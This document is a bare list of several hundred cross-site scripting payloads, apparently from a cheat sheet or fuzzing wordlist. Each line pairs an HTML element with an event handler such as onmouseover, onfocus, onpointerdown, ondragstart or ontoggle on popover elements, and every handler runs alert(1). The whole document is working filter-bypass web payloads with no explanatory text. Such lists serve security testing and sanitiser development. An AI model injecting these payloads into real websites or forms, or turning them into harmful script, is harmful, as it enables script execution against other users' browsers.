<br onmouseover="alert(1)" style=display:block>test</br>
<br onmouseup="alert(1)" style=display:block>test</br>
<br onmousewheel=alert(1) style=display:block>requires scrolling
<br onpaste="alert(1)" contenteditable>test</br>
<br onpointerdown=alert(1) style=display:block>XSS</br>
<br onpointerenter=alert(1) style=display:block>XSS</br>
<br onpointerleave=alert(1) style=display:block>XSS</br>
<br onpointermove=alert(1) style=display:block>XSS</br>
<br onpointerout=alert(1) style=display:block>XSS</br>
<br onpointerover=alert(1) style=display:block>XSS</br>
<br onpointerrawupdate=alert(1) style=display:block>XSS</br>
<br onpointerup=alert(1) style=display:block>XSS</br>
<br onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></br>
<button autofocus onfocus=alert(1)>test</button>
<button autofocus onfocusin=alert(1)>test</button>
<button contenteditable onbeforeinput=alert(1)>test
<button draggable="true" ondrag="alert(1)" style=display:block>test</button>
<button draggable="true" ondragend="alert(1)" style=display:block>test</button>
<button draggable="true" ondragenter="alert(1)" style=display:block>test</button>
<button draggable="true" ondragleave="alert(1)" style=display:block>test</button>
<button draggable="true" ondragstart="alert(1)" style=display:block>test</button>
<button id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></button>
<button onafterscriptexecute=alert(1)><script>1</script>
<button onbeforecopy="alert(1)" contenteditable>test</button>
<button onbeforecut="alert(1)" contenteditable>test</button>
<button onbeforescriptexecute=alert(1)><script>1</script>
<button onblur=alert(1) id=x tabindex=1 style=display:block>test</button><input value=clickme>
<button onclick="alert(1)" style=display:block>test</button>
<button oncontextmenu="alert(1)" style=display:block>test</button>
<button oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<button oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<button ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</button>
<button onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</button><input value=clickme>
<button onkeydown="alert(1)" contenteditable style=display:block>test</button>
<button onkeypress="alert(1)" contenteditable style=display:block>test</button>
<button onkeyup="alert(1)" contenteditable style=display:block>test</button>
<button onmousedown="alert(1)" style=display:block>test</button>
<button onmouseenter="alert(1)" style=display:block>test</button>
<button onmouseleave="alert(1)" style=display:block>test</button>
<button onmousemove="alert(1)" style=display:block>test</button>
<button onmouseout="alert(1)" style=display:block>test</button>
<button onmouseover="alert(1)" style=display:block>test</button>
<button onmouseup="alert(1)" style=display:block>test</button>
<button onmousewheel=alert(1) style=display:block>requires scrolling
<button onpaste="alert(1)" contenteditable>test</button>
<button onpointerdown=alert(1) style=display:block>XSS</button>
<button onpointerenter=alert(1) style=display:block>XSS</button>
<button onpointerleave=alert(1) style=display:block>XSS</button>
<button onpointermove=alert(1) style=display:block>XSS</button>
<button onpointerout=alert(1) style=display:block>XSS</button>
<button onpointerover=alert(1) style=display:block>XSS</button>
<button onpointerrawupdate=alert(1) style=display:block>XSS</button>
<button onpointerup=alert(1) style=display:block>XSS</button>
<button onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></button>
<button popovertarget=x>Click me</button><a onbeforetoggle=alert(1) popover id=x>XSS</a>
<button popovertarget=x>Click me</button><a ontoggle=alert(1) popover id=x>XSS</a>
<button popovertarget=x>Click me</button><a2 onbeforetoggle=alert(1) popover id=x>XSS</a2>
<button popovertarget=x>Click me</button><a2 ontoggle=alert(1) popover id=x>XSS</a2>
<button popovertarget=x>Click me</button><abbr onbeforetoggle=alert(1) popover id=x>XSS</abbr>
<button popovertarget=x>Click me</button><abbr ontoggle=alert(1) popover id=x>XSS</abbr>
<button popovertarget=x>Click me</button><acronym onbeforetoggle=alert(1) popover id=x>XSS</acronym>
<button popovertarget=x>Click me</button><acronym ontoggle=alert(1) popover id=x>XSS</acronym>
<button popovertarget=x>Click me</button><address onbeforetoggle=alert(1) popover id=x>XSS</address>
<button popovertarget=x>Click me</button><address ontoggle=alert(1) popover id=x>XSS</address>
<button popovertarget=x>Click me</button><animate onbeforetoggle=alert(1) popover id=x>XSS</animate>
<button popovertarget=x>Click me</button><animate ontoggle=alert(1) popover id=x>XSS</animate>
<button popovertarget=x>Click me</button><animatemotion onbeforetoggle=alert(1) popover id=x>XSS</animatemotion>
<button popovertarget=x>Click me</button><animatemotion ontoggle=alert(1) popover id=x>XSS</animatemotion>
<button popovertarget=x>Click me</button><animatetransform onbeforetoggle=alert(1) popover id=x>XSS</animatetransform>
<button popovertarget=x>Click me</button><animatetransform ontoggle=alert(1) popover id=x>XSS</animatetransform>
<button popovertarget=x>Click me</button><applet onbeforetoggle=alert(1) popover id=x>XSS</applet>
<button popovertarget=x>Click me</button><applet ontoggle=alert(1) popover id=x>XSS</applet>
<button popovertarget=x>Click me</button><area onbeforetoggle=alert(1) popover id=x>XSS</area>
<button popovertarget=x>Click me</button><area ontoggle=alert(1) popover id=x>XSS</area>
<button popovertarget=x>Click me</button><article onbeforetoggle=alert(1) popover id=x>XSS</article>
<button popovertarget=x>Click me</button><article ontoggle=alert(1) popover id=x>XSS</article>
<button popovertarget=x>Click me</button><aside onbeforetoggle=alert(1) popover id=x>XSS</aside>
<button popovertarget=x>Click me</button><aside ontoggle=alert(1) popover id=x>XSS</aside>
<button popovertarget=x>Click me</button><audio onbeforetoggle=alert(1) popover id=x>XSS</audio>
<button popovertarget=x>Click me</button><audio ontoggle=alert(1) popover id=x>XSS</audio>
<button popovertarget=x>Click me</button><audio2 onbeforetoggle=alert(1) popover id=x>XSS</audio2>
<button popovertarget=x>Click me</button><audio2 ontoggle=alert(1) popover id=x>XSS</audio2>
<button popovertarget=x>Click me</button><b onbeforetoggle=alert(1) popover id=x>XSS</b>
<button popovertarget=x>Click me</button><b ontoggle=alert(1) popover id=x>XSS</b>
<button popovertarget=x>Click me</button><bdi onbeforetoggle=alert(1) popover id=x>XSS</bdi>
<button popovertarget=x>Click me</button><bdi ontoggle=alert(1) popover id=x>XSS</bdi>
<button popovertarget=x>Click me</button><bdo onbeforetoggle=alert(1) popover id=x>XSS</bdo>
<button popovertarget=x>Click me</button><bdo ontoggle=alert(1) popover id=x>XSS</bdo>
<button popovertarget=x>Click me</button><big onbeforetoggle=alert(1) popover id=x>XSS</big>
<button popovertarget=x>Click me</button><big ontoggle=alert(1) popover id=x>XSS</big>
<button popovertarget=x>Click me</button><blink onbeforetoggle=alert(1) popover id=x>XSS</blink>
<button popovertarget=x>Click me</button><blink ontoggle=alert(1) popover id=x>XSS</blink>
<button popovertarget=x>Click me</button><blockquote onbeforetoggle=alert(1) popover id=x>XSS</blockquote>
<button popovertarget=x>Click me</button><blockquote ontoggle=alert(1) popover id=x>XSS</blockquote>
<button popovertarget=x>Click me</button><body onbeforetoggle=alert(1) popover id=x>XSS</body>
<button popovertarget=x>Click me</button><body ontoggle=alert(1) popover id=x>XSS</body>
<button popovertarget=x>Click me</button><br onbeforetoggle=alert(1) popover id=x>XSS</br>
<button popovertarget=x>Click me</button><br ontoggle=alert(1) popover id=x>XSS</br>
<button popovertarget=x>Click me</button><button onbeforetoggle=alert(1) popover id=x>XSS</button>
<button popovertarget=x>Click me</button><button ontoggle=alert(1) popover id=x>XSS</button>
<button popovertarget=x>Click me</button><canvas onbeforetoggle=alert(1) popover id=x>XSS</canvas>
<button popovertarget=x>Click me</button><canvas ontoggle=alert(1) popover id=x>XSS</canvas>
<button popovertarget=x>Click me</button><caption onbeforetoggle=alert(1) popover id=x>XSS</caption>
<button popovertarget=x>Click me</button><caption ontoggle=alert(1) popover id=x>XSS</caption>
<button popovertarget=x>Click me</button><center onbeforetoggle=alert(1) popover id=x>XSS</center>
<button popovertarget=x>Click me</button><center ontoggle=alert(1) popover id=x>XSS</center>
<button popovertarget=x>Click me</button><cite onbeforetoggle=alert(1) popover id=x>XSS</cite>
<button popovertarget=x>Click me</button><cite ontoggle=alert(1) popover id=x>XSS</cite>
<button popovertarget=x>Click me</button><code onbeforetoggle=alert(1) popover id=x>XSS</code>
<button popovertarget=x>Click me</button><code ontoggle=alert(1) popover id=x>XSS</code>
<button popovertarget=x>Click me</button><col onbeforetoggle=alert(1) popover id=x>XSS</col>
<button popovertarget=x>Click me</button><col ontoggle=alert(1) popover id=x>XSS</col>
<button popovertarget=x>Click me</button><colgroup onbeforetoggle=alert(1) popover id=x>XSS</colgroup>
<button popovertarget=x>Click me</button><colgroup ontoggle=alert(1) popover id=x>XSS</colgroup>
<button popovertarget=x>Click me</button><command onbeforetoggle=alert(1) popover id=x>XSS</command>
<button popovertarget=x>Click me</button><command ontoggle=alert(1) popover id=x>XSS</command>
<button popovertarget=x>Click me</button><content onbeforetoggle=alert(1) popover id=x>XSS</content>
<button popovertarget=x>Click me</button><content ontoggle=alert(1) popover id=x>XSS</content>
<button popovertarget=x>Click me</button><custom tags onbeforetoggle=alert(1) popover id=x>XSS</custom tags>
<button popovertarget=x>Click me</button><custom tags ontoggle=alert(1) popover id=x>XSS</custom tags>
<button popovertarget=x>Click me</button><data onbeforetoggle=alert(1) popover id=x>XSS</data>
<button popovertarget=x>Click me</button><data ontoggle=alert(1) popover id=x>XSS</data>
<button popovertarget=x>Click me</button><datalist onbeforetoggle=alert(1) popover id=x>XSS</datalist>
<button popovertarget=x>Click me</button><datalist ontoggle=alert(1) popover id=x>XSS</datalist>
<button popovertarget=x>Click me</button><dd onbeforetoggle=alert(1) popover id=x>XSS</dd>
<button popovertarget=x>Click me</button><dd ontoggle=alert(1) popover id=x>XSS</dd>
<button popovertarget=x>Click me</button><del onbeforetoggle=alert(1) popover id=x>XSS</del>
<button popovertarget=x>Click me</button><del ontoggle=alert(1) popover id=x>XSS</del>
<button popovertarget=x>Click me</button><details onbeforetoggle=alert(1) popover id=x>XSS</details>
<button popovertarget=x>Click me</button><details ontoggle=alert(1) popover id=x>XSS</details>
<button popovertarget=x>Click me</button><dfn onbeforetoggle=alert(1) popover id=x>XSS</dfn>
<button popovertarget=x>Click me</button><dfn ontoggle=alert(1) popover id=x>XSS</dfn>
<button popovertarget=x>Click me</button><dialog onbeforetoggle=alert(1) popover id=x>XSS</dialog>
<button popovertarget=x>Click me</button><dialog ontoggle=alert(1) popover id=x>XSS</dialog>
<button popovertarget=x>Click me</button><dir onbeforetoggle=alert(1) popover id=x>XSS</dir>
<button popovertarget=x>Click me</button><dir ontoggle=alert(1) popover id=x>XSS</dir>
<button popovertarget=x>Click me</button><div onbeforetoggle=alert(1) popover id=x>XSS</div>
<button popovertarget=x>Click me</button><div ontoggle=alert(1) popover id=x>XSS</div>
<button popovertarget=x>Click me</button><dl onbeforetoggle=alert(1) popover id=x>XSS</dl>
<button popovertarget=x>Click me</button><dl ontoggle=alert(1) popover id=x>XSS</dl>
<button popovertarget=x>Click me</button><dt onbeforetoggle=alert(1) popover id=x>XSS</dt>
<button popovertarget=x>Click me</button><dt ontoggle=alert(1) popover id=x>XSS</dt>
<button popovertarget=x>Click me</button><element onbeforetoggle=alert(1) popover id=x>XSS</element>
<button popovertarget=x>Click me</button><element ontoggle=alert(1) popover id=x>XSS</element>
<button popovertarget=x>Click me</button><em onbeforetoggle=alert(1) popover id=x>XSS</em>
<button popovertarget=x>Click me</button><em ontoggle=alert(1) popover id=x>XSS</em>
<button popovertarget=x>Click me</button><embed onbeforetoggle=alert(1) popover id=x>XSS</embed>
<button popovertarget=x>Click me</button><embed ontoggle=alert(1) popover id=x>XSS</embed>
<button popovertarget=x>Click me</button><fieldset onbeforetoggle=alert(1) popover id=x>XSS</fieldset>
<button popovertarget=x>Click me</button><fieldset ontoggle=alert(1) popover id=x>XSS</fieldset>
<button popovertarget=x>Click me</button><figcaption onbeforetoggle=alert(1) popover id=x>XSS</figcaption>
<button popovertarget=x>Click me</button><figcaption ontoggle=alert(1) popover id=x>XSS</figcaption>
<button popovertarget=x>Click me</button><figure onbeforetoggle=alert(1) popover id=x>XSS</figure>
<button popovertarget=x>Click me</button><figure ontoggle=alert(1) popover id=x>XSS</figure>
<button popovertarget=x>Click me</button><font onbeforetoggle=alert(1) popover id=x>XSS</font>
<button popovertarget=x>Click me</button><font ontoggle=alert(1) popover id=x>XSS</font>
<button popovertarget=x>Click me</button><footer onbeforetoggle=alert(1) popover id=x>XSS</footer>
<button popovertarget=x>Click me</button><footer ontoggle=alert(1) popover id=x>XSS</footer>
<button popovertarget=x>Click me</button><form onbeforetoggle=alert(1) popover id=x>XSS</form>
<button popovertarget=x>Click me</button><form ontoggle=alert(1) popover id=x>XSS</form>
<button popovertarget=x>Click me</button><frame onbeforetoggle=alert(1) popover id=x>XSS</frame>
<button popovertarget=x>Click me</button><frame ontoggle=alert(1) popover id=x>XSS</frame>
<button popovertarget=x>Click me</button><frameset onbeforetoggle=alert(1) popover id=x>XSS</frameset>
<button popovertarget=x>Click me</button><frameset ontoggle=alert(1) popover id=x>XSS</frameset>
<button popovertarget=x>Click me</button><h1 onbeforetoggle=alert(1) popover id=x>XSS</h1>
<button popovertarget=x>Click me</button><h1 ontoggle=alert(1) popover id=x>XSS</h1>
<button popovertarget=x>Click me</button><head onbeforetoggle=alert(1) popover id=x>XSS</head>
<button popovertarget=x>Click me</button><head ontoggle=alert(1) popover id=x>XSS</head>
<button popovertarget=x>Click me</button><header onbeforetoggle=alert(1) popover id=x>XSS</header>
<button popovertarget=x>Click me</button><header ontoggle=alert(1) popover id=x>XSS</header>
<button popovertarget=x>Click me</button><hgroup onbeforetoggle=alert(1) popover id=x>XSS</hgroup>
<button popovertarget=x>Click me</button><hgroup ontoggle=alert(1) popover id=x>XSS</hgroup>
<button popovertarget=x>Click me</button><hr onbeforetoggle=alert(1) popover id=x>XSS</hr>
<button popovertarget=x>Click me</button><hr ontoggle=alert(1) popover id=x>XSS</hr>
<button popovertarget=x>Click me</button><html onbeforetoggle=alert(1) popover id=x>XSS</html>
<button popovertarget=x>Click me</button><html ontoggle=alert(1) popover id=x>XSS</html>
<button popovertarget=x>Click me</button><i onbeforetoggle=alert(1) popover id=x>XSS</i>
<button popovertarget=x>Click me</button><i ontoggle=alert(1) popover id=x>XSS</i>
<button popovertarget=x>Click me</button><iframe onbeforetoggle=alert(1) popover id=x>XSS</iframe>
<button popovertarget=x>Click me</button><iframe ontoggle=alert(1) popover id=x>XSS</iframe>
<button popovertarget=x>Click me</button><iframe2 onbeforetoggle=alert(1) popover id=x>XSS</iframe2>
<button popovertarget=x>Click me</button><iframe2 ontoggle=alert(1) popover id=x>XSS</iframe2>
<button popovertarget=x>Click me</button><image onbeforetoggle=alert(1) popover id=x>XSS</image>
<button popovertarget=x>Click me</button><image ontoggle=alert(1) popover id=x>XSS</image>
<button popovertarget=x>Click me</button><image2 onbeforetoggle=alert(1) popover id=x>XSS</image2>
<button popovertarget=x>Click me</button><image2 ontoggle=alert(1) popover id=x>XSS</image2>
<button popovertarget=x>Click me</button><image3 onbeforetoggle=alert(1) popover id=x>XSS</image3>
<button popovertarget=x>Click me</button><image3 ontoggle=alert(1) popover id=x>XSS</image3>
<button popovertarget=x>Click me</button><img onbeforetoggle=alert(1) popover id=x>XSS</img>
<button popovertarget=x>Click me</button><img ontoggle=alert(1) popover id=x>XSS</img>
<button popovertarget=x>Click me</button><img2 onbeforetoggle=alert(1) popover id=x>XSS</img2>
<button popovertarget=x>Click me</button><img2 ontoggle=alert(1) popover id=x>XSS</img2>
<button popovertarget=x>Click me</button><input onbeforetoggle=alert(1) popover id=x>XSS</input>
<button popovertarget=x>Click me</button><input ontoggle=alert(1) popover id=x>XSS</input>
<button popovertarget=x>Click me</button><input2 onbeforetoggle=alert(1) popover id=x>XSS</input2>
<button popovertarget=x>Click me</button><input2 ontoggle=alert(1) popover id=x>XSS</input2>
<button popovertarget=x>Click me</button><input3 onbeforetoggle=alert(1) popover id=x>XSS</input3>
<button popovertarget=x>Click me</button><input3 ontoggle=alert(1) popover id=x>XSS</input3>
<button popovertarget=x>Click me</button><input4 onbeforetoggle=alert(1) popover id=x>XSS</input4>
<button popovertarget=x>Click me</button><input4 ontoggle=alert(1) popover id=x>XSS</input4>
<button popovertarget=x>Click me</button><ins onbeforetoggle=alert(1) popover id=x>XSS</ins>
<button popovertarget=x>Click me</button><ins ontoggle=alert(1) popover id=x>XSS</ins>
<button popovertarget=x>Click me</button><kbd onbeforetoggle=alert(1) popover id=x>XSS</kbd>
<button popovertarget=x>Click me</button><kbd ontoggle=alert(1) popover id=x>XSS</kbd>
<button popovertarget=x>Click me</button><keygen onbeforetoggle=alert(1) popover id=x>XSS</keygen>
<button popovertarget=x>Click me</button><keygen ontoggle=alert(1) popover id=x>XSS</keygen>
<button popovertarget=x>Click me</button><label onbeforetoggle=alert(1) popover id=x>XSS</label>
<button popovertarget=x>Click me</button><label ontoggle=alert(1) popover id=x>XSS</label>
<button popovertarget=x>Click me</button><legend onbeforetoggle=alert(1) popover id=x>XSS</legend>
<button popovertarget=x>Click me</button><legend ontoggle=alert(1) popover id=x>XSS</legend>
<button popovertarget=x>Click me</button><li onbeforetoggle=alert(1) popover id=x>XSS</li>
<button popovertarget=x>Click me</button><li ontoggle=alert(1) popover id=x>XSS</li>
<button popovertarget=x>Click me</button><link onbeforetoggle=alert(1) popover id=x>XSS</link>
<button popovertarget=x>Click me</button><link ontoggle=alert(1) popover id=x>XSS</link>
<button popovertarget=x>Click me</button><listing onbeforetoggle=alert(1) popover id=x>XSS</listing>
<button popovertarget=x>Click me</button><listing ontoggle=alert(1) popover id=x>XSS</listing>
<button popovertarget=x>Click me</button><main onbeforetoggle=alert(1) popover id=x>XSS</main>
<button popovertarget=x>Click me</button><main ontoggle=alert(1) popover id=x>XSS</main>
<button popovertarget=x>Click me</button><map onbeforetoggle=alert(1) popover id=x>XSS</map>
<button popovertarget=x>Click me</button><map ontoggle=alert(1) popover id=x>XSS</map>
<button popovertarget=x>Click me</button><mark onbeforetoggle=alert(1) popover id=x>XSS</mark>
<button popovertarget=x>Click me</button><mark ontoggle=alert(1) popover id=x>XSS</mark>
<button popovertarget=x>Click me</button><marquee onbeforetoggle=alert(1) popover id=x>XSS</marquee>
<button popovertarget=x>Click me</button><marquee ontoggle=alert(1) popover id=x>XSS</marquee>
<button popovertarget=x>Click me</button><menu onbeforetoggle=alert(1) popover id=x>XSS</menu>
<button popovertarget=x>Click me</button><menu ontoggle=alert(1) popover id=x>XSS</menu>
<button popovertarget=x>Click me</button><menuitem onbeforetoggle=alert(1) popover id=x>XSS</menuitem>
<button popovertarget=x>Click me</button><menuitem ontoggle=alert(1) popover id=x>XSS</menuitem>
<button popovertarget=x>Click me</button><meta onbeforetoggle=alert(1) popover id=x>XSS</meta>
<button popovertarget=x>Click me</button><meta ontoggle=alert(1) popover id=x>XSS</meta>
<button popovertarget=x>Click me</button><meter onbeforetoggle=alert(1) popover id=x>XSS</meter>
<button popovertarget=x>Click me</button><meter ontoggle=alert(1) popover id=x>XSS</meter>
<button popovertarget=x>Click me</button><multicol onbeforetoggle=alert(1) popover id=x>XSS</multicol>
<button popovertarget=x>Click me</button><multicol ontoggle=alert(1) popover id=x>XSS</multicol>
<button popovertarget=x>Click me</button><nav onbeforetoggle=alert(1) popover id=x>XSS</nav>
<button popovertarget=x>Click me</button><nav ontoggle=alert(1) popover id=x>XSS</nav>
<button popovertarget=x>Click me</button><nextid onbeforetoggle=alert(1) popover id=x>XSS</nextid>
<button popovertarget=x>Click me</button><nextid ontoggle=alert(1) popover id=x>XSS</nextid>
<button popovertarget=x>Click me</button><nobr onbeforetoggle=alert(1) popover id=x>XSS</nobr>
<button popovertarget=x>Click me</button><nobr ontoggle=alert(1) popover id=x>XSS</nobr>
<button popovertarget=x>Click me</button><noembed onbeforetoggle=alert(1) popover id=x>XSS</noembed>
<button popovertarget=x>Click me</button><noembed ontoggle=alert(1) popover id=x>XSS</noembed>
<button popovertarget=x>Click me</button><noframes onbeforetoggle=alert(1) popover id=x>XSS</noframes>
<button popovertarget=x>Click me</button><noframes ontoggle=alert(1) popover id=x>XSS</noframes>
<button popovertarget=x>Click me</button><noscript onbeforetoggle=alert(1) popover id=x>XSS</noscript>
<button popovertarget=x>Click me</button><noscript ontoggle=alert(1) popover id=x>XSS</noscript>
<button popovertarget=x>Click me</button><object onbeforetoggle=alert(1) popover id=x>XSS</object>
<button popovertarget=x>Click me</button><object ontoggle=alert(1) popover id=x>XSS</object>
<button popovertarget=x>Click me</button><ol onbeforetoggle=alert(1) popover id=x>XSS</ol>
<button popovertarget=x>Click me</button><ol ontoggle=alert(1) popover id=x>XSS</ol>
<button popovertarget=x>Click me</button><optgroup onbeforetoggle=alert(1) popover id=x>XSS</optgroup>
<button popovertarget=x>Click me</button><optgroup ontoggle=alert(1) popover id=x>XSS</optgroup>
<button popovertarget=x>Click me</button><option onbeforetoggle=alert(1) popover id=x>XSS</option>
<button popovertarget=x>Click me</button><option ontoggle=alert(1) popover id=x>XSS</option>
<button popovertarget=x>Click me</button><output onbeforetoggle=alert(1) popover id=x>XSS</output>
<button popovertarget=x>Click me</button><output ontoggle=alert(1) popover id=x>XSS</output>
<button popovertarget=x>Click me</button><p onbeforetoggle=alert(1) popover id=x>XSS</p>
<button popovertarget=x>Click me</button><p ontoggle=alert(1) popover id=x>XSS</p>
<button popovertarget=x>Click me</button><param onbeforetoggle=alert(1) popover id=x>XSS</param>
<button popovertarget=x>Click me</button><param ontoggle=alert(1) popover id=x>XSS</param>
<button popovertarget=x>Click me</button><picture onbeforetoggle=alert(1) popover id=x>XSS</picture>
<button popovertarget=x>Click me</button><picture ontoggle=alert(1) popover id=x>XSS</picture>
<button popovertarget=x>Click me</button><plaintext onbeforetoggle=alert(1) popover id=x>XSS</plaintext>
<button popovertarget=x>Click me</button><plaintext ontoggle=alert(1) popover id=x>XSS</plaintext>
<button popovertarget=x>Click me</button><pre onbeforetoggle=alert(1) popover id=x>XSS</pre>
<button popovertarget=x>Click me</button><pre ontoggle=alert(1) popover id=x>XSS</pre>
<button popovertarget=x>Click me</button><progress onbeforetoggle=alert(1) popover id=x>XSS</progress>
<button popovertarget=x>Click me</button><progress ontoggle=alert(1) popover id=x>XSS</progress>
<button popovertarget=x>Click me</button><q onbeforetoggle=alert(1) popover id=x>XSS</q>
<button popovertarget=x>Click me</button><q ontoggle=alert(1) popover id=x>XSS</q>
<button popovertarget=x>Click me</button><rb onbeforetoggle=alert(1) popover id=x>XSS</rb>
<button popovertarget=x>Click me</button><rb ontoggle=alert(1) popover id=x>XSS</rb>
<button popovertarget=x>Click me</button><rp onbeforetoggle=alert(1) popover id=x>XSS</rp>
<button popovertarget=x>Click me</button><rp ontoggle=alert(1) popover id=x>XSS</rp>
<button popovertarget=x>Click me</button><rt onbeforetoggle=alert(1) popover id=x>XSS</rt>
<button popovertarget=x>Click me</button><rt ontoggle=alert(1) popover id=x>XSS</rt>
<button popovertarget=x>Click me</button><rtc onbeforetoggle=alert(1) popover id=x>XSS</rtc>
<button popovertarget=x>Click me</button><rtc ontoggle=alert(1) popover id=x>XSS</rtc>
<button popovertarget=x>Click me</button><ruby onbeforetoggle=alert(1) popover id=x>XSS</ruby>
<button popovertarget=x>Click me</button><ruby ontoggle=alert(1) popover id=x>XSS</ruby>
<button popovertarget=x>Click me</button><s onbeforetoggle=alert(1) popover id=x>XSS</s>
<button popovertarget=x>Click me</button><s ontoggle=alert(1) popover id=x>XSS</s>
<button popovertarget=x>Click me</button><samp onbeforetoggle=alert(1) popover id=x>XSS</samp>
<button popovertarget=x>Click me</button><samp ontoggle=alert(1) popover id=x>XSS</samp>
<button popovertarget=x>Click me</button><script onbeforetoggle=alert(1) popover id=x>XSS</script>
<button popovertarget=x>Click me</button><script ontoggle=alert(1) popover id=x>XSS</script>
<button popovertarget=x>Click me</button><section onbeforetoggle=alert(1) popover id=x>XSS</section>
<button popovertarget=x>Click me</button><section ontoggle=alert(1) popover id=x>XSS</section>
<button popovertarget=x>Click me</button><select onbeforetoggle=alert(1) popover id=x>XSS</select>
<button popovertarget=x>Click me</button><select ontoggle=alert(1) popover id=x>XSS</select>
<button popovertarget=x>Click me</button><set onbeforetoggle=alert(1) popover id=x>XSS</set>
<button popovertarget=x>Click me</button><set ontoggle=alert(1) popover id=x>XSS</set>
<button popovertarget=x>Click me</button><shadow onbeforetoggle=alert(1) popover id=x>XSS</shadow>
<button popovertarget=x>Click me</button><shadow ontoggle=alert(1) popover id=x>XSS</shadow>
<button popovertarget=x>Click me</button><slot onbeforetoggle=alert(1) popover id=x>XSS</slot>
<button popovertarget=x>Click me</button><slot ontoggle=alert(1) popover id=x>XSS</slot>
<button popovertarget=x>Click me</button><small onbeforetoggle=alert(1) popover id=x>XSS</small>
<button popovertarget=x>Click me</button><small ontoggle=alert(1) popover id=x>XSS</small>
<button popovertarget=x>Click me</button><source onbeforetoggle=alert(1) popover id=x>XSS</source>
<button popovertarget=x>Click me</button><source ontoggle=alert(1) popover id=x>XSS</source>
<button popovertarget=x>Click me</button><spacer onbeforetoggle=alert(1) popover id=x>XSS</spacer>
<button popovertarget=x>Click me</button><spacer ontoggle=alert(1) popover id=x>XSS</spacer>
<button popovertarget=x>Click me</button><span onbeforetoggle=alert(1) popover id=x>XSS</span>
<button popovertarget=x>Click me</button><span ontoggle=alert(1) popover id=x>XSS</span>
<button popovertarget=x>Click me</button><strike onbeforetoggle=alert(1) popover id=x>XSS</strike>
<button popovertarget=x>Click me</button><strike ontoggle=alert(1) popover id=x>XSS</strike>
<button popovertarget=x>Click me</button><strong onbeforetoggle=alert(1) popover id=x>XSS</strong>
<button popovertarget=x>Click me</button><strong ontoggle=alert(1) popover id=x>XSS</strong>
<button popovertarget=x>Click me</button><style onbeforetoggle=alert(1) popover id=x>XSS</style>
<button popovertarget=x>Click me</button><style ontoggle=alert(1) popover id=x>XSS</style>
<button popovertarget=x>Click me</button><sub onbeforetoggle=alert(1) popover id=x>XSS</sub>
<button popovertarget=x>Click me</button><sub ontoggle=alert(1) popover id=x>XSS</sub>
<button popovertarget=x>Click me</button><summary onbeforetoggle=alert(1) popover id=x>XSS</summary>
<button popovertarget=x>Click me</button><summary ontoggle=alert(1) popover id=x>XSS</summary>
<button popovertarget=x>Click me</button><sup onbeforetoggle=alert(1) popover id=x>XSS</sup>
<button popovertarget=x>Click me</button><sup ontoggle=alert(1) popover id=x>XSS</sup>
<button popovertarget=x>Click me</button><svg onbeforetoggle=alert(1) popover id=x>XSS</svg>
<button popovertarget=x>Click me</button><svg ontoggle=alert(1) popover id=x>XSS</svg>
<button popovertarget=x>Click me</button><table onbeforetoggle=alert(1) popover id=x>XSS</table>
<button popovertarget=x>Click me</button><table ontoggle=alert(1) popover id=x>XSS</table>
<button popovertarget=x>Click me</button><tbody onbeforetoggle=alert(1) popover id=x>XSS</tbody>
<button popovertarget=x>Click me</button><tbody ontoggle=alert(1) popover id=x>XSS</tbody>
<button popovertarget=x>Click me</button><td onbeforetoggle=alert(1) popover id=x>XSS</td>
<button popovertarget=x>Click me</button><td ontoggle=alert(1) popover id=x>XSS</td>
<button popovertarget=x>Click me</button><template onbeforetoggle=alert(1) popover id=x>XSS</template>
<button popovertarget=x>Click me</button><template ontoggle=alert(1) popover id=x>XSS</template>
<button popovertarget=x>Click me</button><textarea onbeforetoggle=alert(1) popover id=x>XSS</textarea>
<button popovertarget=x>Click me</button><textarea ontoggle=alert(1) popover id=x>XSS</textarea>
<button popovertarget=x>Click me</button><tfoot onbeforetoggle=alert(1) popover id=x>XSS</tfoot>
<button popovertarget=x>Click me</button><tfoot ontoggle=alert(1) popover id=x>XSS</tfoot>
<button popovertarget=x>Click me</button><th onbeforetoggle=alert(1) popover id=x>XSS</th>
<button popovertarget=x>Click me</button><th ontoggle=alert(1) popover id=x>XSS</th>
<button popovertarget=x>Click me</button><thead onbeforetoggle=alert(1) popover id=x>XSS</thead>
<button popovertarget=x>Click me</button><thead ontoggle=alert(1) popover id=x>XSS</thead>
<button popovertarget=x>Click me</button><time onbeforetoggle=alert(1) popover id=x>XSS</time>
<button popovertarget=x>Click me</button><time ontoggle=alert(1) popover id=x>XSS</time>
<button popovertarget=x>Click me</button><title onbeforetoggle=alert(1) popover id=x>XSS</title>
<button popovertarget=x>Click me</button><title ontoggle=alert(1) popover id=x>XSS</title>
<button popovertarget=x>Click me</button><tr onbeforetoggle=alert(1) popover id=x>XSS</tr>
<button popovertarget=x>Click me</button><tr ontoggle=alert(1) popover id=x>XSS</tr>
<button popovertarget=x>Click me</button><track onbeforetoggle=alert(1) popover id=x>XSS</track>
<button popovertarget=x>Click me</button><track ontoggle=alert(1) popover id=x>XSS</track>
<button popovertarget=x>Click me</button><tt onbeforetoggle=alert(1) popover id=x>XSS</tt>
<button popovertarget=x>Click me</button><tt ontoggle=alert(1) popover id=x>XSS</tt>
<button popovertarget=x>Click me</button><u onbeforetoggle=alert(1) popover id=x>XSS</u>
<button popovertarget=x>Click me</button><u ontoggle=alert(1) popover id=x>XSS</u>
<button popovertarget=x>Click me</button><ul onbeforetoggle=alert(1) popover id=x>XSS</ul>
<button popovertarget=x>Click me</button><ul ontoggle=alert(1) popover id=x>XSS</ul>
<button popovertarget=x>Click me</button><var onbeforetoggle=alert(1) popover id=x>XSS</var>
<button popovertarget=x>Click me</button><var ontoggle=alert(1) popover id=x>XSS</var>
<button popovertarget=x>Click me</button><video onbeforetoggle=alert(1) popover id=x>XSS</video>
<button popovertarget=x>Click me</button><video ontoggle=alert(1) popover id=x>XSS</video>
